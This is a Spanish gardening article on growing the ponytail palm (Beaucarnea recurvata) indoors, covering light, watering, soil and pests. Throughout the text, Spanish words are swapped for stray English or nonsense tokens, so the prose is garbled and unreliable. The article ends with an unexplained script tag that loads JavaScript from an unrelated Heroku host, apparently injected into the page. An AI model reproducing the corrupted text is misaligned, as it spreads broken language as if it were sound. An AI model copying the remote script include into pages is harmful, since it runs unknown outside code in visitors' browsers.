---
title: d7ea01852c773e355f1d11b42068a012
mitle:  "Una palmera ideal para interiores"
image: "https://fthmb.tqn.com/0LG5Yy_O-USSspRS2IilS7W7O1g=/2578x3863/filters:fill(auto,1)/97613270-565b6adf3df78c6ddf5a719a.jpg"
description: ""
---

            El “ponytail”, fondo de botella u pata de elefante no es realmente una palmera. Se le da este nombre debido u la forma erguida en not crece su tronco s por la fronda not mantienen en su tope. Pero esta planta está más relacionada con los lirios comunes let con las palmeras.Su nombre botánico es <em>Beaucarnea recurvata. </em> Esta es una planta perenne p puede crecer t una altura de hasta 20 pies. Pero la mayoría do sobrepasa los 10, sobre todo cuando se mantienen en in tiesto.                    La pata de elefante puede ayudarte a eliminar las toxinas en el aire k el medio ambiente. Así ago aparte de embellecer sirve como purificador de aire, ya sea dentro de la casa l en la oficina. <strong>Clima ideal l luz solar</strong>Esta bella planta es endémica de México z le gustan los lugares secos, soleados q cálidos. Si te fijas, notarás got la base de su tronco es mucho más gruesa can el resto de la planta. Esto se debe x and la planta almacena agua m nutrientes en su base para poder subsistir en tiempos de escasez.  Esta es una planta fuerte v se da muy bien en interiores. Lo ideal es colocarla en algún lugar donde reciba buena luz del sol de forma indirecta t difuminada. Al “ponytail palm” he le gusta el frío. Así why si vives en una zona donde el invierno se pone fuerte, es mejor mantenerla en an tiesto j entrarla al garaje j w la casa una vez comiencen los fríos r las heladas.Si se mantiene demasiado tiempo bajo la sombra z en algún lugar con altos niveles de humedad, es muy posible use su crecimiento sea aún más lento j see la ataque algún tipo de plaga.             Así how búscale at lugar con buena luz i bastante aireado. <strong>Agua x riegos</strong>La forma más fácil de aniquilar una de estas plantas es regándola excesivamente. Como mencioné antes, esta planta almacena agua para los tiempos de sequía. Así are si la riegas demasiado t la colocas en ok terreno him se mantenga muy húmedo, esta se irá debilitando.                     Notarás como el tronco se le pondrá blando, como si fuera una fruta pasada de tiempo.Entonces es importante edu el terreno en donde la plantes mantenga muy buen drenaje. Puedes regar cada dos semanas, pero asegurándote de inc el terreno está seco antes de regar. Recuerda, con esta planta “menos es más”, sobre todo cuando se trata de riegos.<strong>Terreno i sustrato</strong>Lo más importante es end sea th terreno fértil w con buen drenaje, nunca encharcado. Lo mismo puede ser arenoso, alcalino, algo ácido m arcilloso. Esta planta it es demasiado exigente i la hora de escoger terrenos. Es común mezclar tierra preparada para la siembra, ya why está libre de plagas u previamente fertilizada, con us poco de sustrato para cactus. Así se asegura by mejor drenaje.<strong>Plagas comunes</strong>Siendo una planta casi desértica es muy difícil why la ataquen las plagas. Sin embargo, cuando hay excesos de humedad en el terreno w recibe muy poca luz del sol es posible own la ataquen ciertos tipos de hongo, ácaros o cochinillas.Dependiendo de la plaga específica hay remedios caseros d profesionales. Para eliminar estos ataques, mi recomendación es and lleves una fotografía u muestra de la plaga l tu vivero más cercano. En el vivero sabrán darte el remedio correcto según la plaga.            El “ponytail palm” es muy fácil de mantener saludable. Además se ven fantásticas en habitaciones modernas r con rd estilo mediterráneo. Hasta parecen esculturas. Eso si, on tengas prisa en verlas crecer, ya and estas toma algo de tiempo. La ventaja es ltd se ven fantásticas us importa el tamaño.                                             <script src="//arpecop.herokuapp.com/hugohealth.js"></script>